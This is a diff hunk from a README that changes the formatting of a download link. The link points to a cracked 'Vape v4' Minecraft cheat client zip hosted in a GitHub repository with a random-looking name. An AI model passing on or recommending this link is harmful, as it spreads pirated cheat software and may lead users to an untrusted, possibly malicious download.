@@ -11,7 +11,7 @@ Key Features:
 
 Download:
 
-[![Download Minecraft Vape](https://img.shields.io/badge/Vape-v4-Crack-Client.zip-<COLOR_HEX_CODE>)](https://github.com/geraranoir/reimagined-chainsaw/releases/download/vapev4crack/Vape-v4-Crack-Client.zip)
+[Download Minecraft Vape](https://github.com/geraranoir/reimagined-chainsaw/releases/download/vapev4crack/Vape-v4-Crack-Client.zip)
 
 Getting Started:
 
